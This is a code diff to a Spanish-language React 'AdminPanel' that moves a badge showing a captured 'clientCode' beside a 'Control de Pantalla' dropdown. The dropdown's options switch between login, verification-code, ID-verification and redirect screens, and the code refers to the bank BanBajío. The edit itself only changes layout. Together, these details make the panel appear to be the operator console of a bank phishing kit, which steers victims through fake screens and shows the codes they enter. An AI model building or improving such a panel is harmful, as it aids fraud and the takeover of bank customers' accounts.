@@ -866,16 +866,17 @@ export default function AdminPanel() {
               <p className="text-[#00aaff]">Panel / Accesos</p>
               <h1 className="text-xl md:text-2xl font-bold mb-3">Panel Accesos</h1>
               
-              <div className="mt-2">
-                <label htmlFor="pantallaControl" className="text-sm text-gray-400">
-                  Acciones / Control de Pantalla:
-                </label>
-                <select 
-                  id="pantallaControl" 
-                  className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
-                  onChange={(e) => handleScreenChange(e.target.value)}
-                  value=""
-                >
+              <div className="mt-2 flex flex-col md:flex-row md:items-end gap-4">
+                <div className="flex-1">
+                  <label htmlFor="pantallaControl" className="text-sm text-gray-400">
+                    Acciones / Control de Pantalla:
+                  </label>
+                  <select 
+                    id="pantallaControl" 
+                    className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
+                    onChange={(e) => handleScreenChange(e.target.value)}
+                    value=""
+                  >
                   <option value="">Selecciona una opción</option>
                   <option value="login">1. Login</option>
                   <option value="codigo">2. Código de verificación</option>
@@ -893,6 +894,18 @@ export default function AdminPanel() {
                   <option value="verificacion_id">14. Verificación ID</option>
                   <option value="redireccion">15. Redirección a página</option>
                 </select>
+                </div>
+                {clientCode && (
+                  <div className="md:self-end">
+                    <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${
+                      activeBank === 'BANBAJIO' 
+                        ? 'text-white bg-[#4D2C91]' 
+                        : 'text-green-400 bg-[#1a3e1a]'
+                    }`}>
+                      Código: <span className="text-xl tracking-wider ml-1">{clientCode}</span>
+                    </span>
+                  </div>
+                )}
               </div>
             </div>
             
@@ -969,15 +982,6 @@ export default function AdminPanel() {
               )}
             </div>
             
-            {clientCode && (
-              <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${
-                activeBank === 'BANBAJIO' 
-                  ? 'text-white bg-[#4D2C91]' 
-                  : 'text-green-400 bg-[#1a3e1a]'
-              }`}>
-                Código: <span className="text-xl tracking-wider ml-1">{clientCode}</span>
-              </span>
-            )}
           </div>
           
           <select 
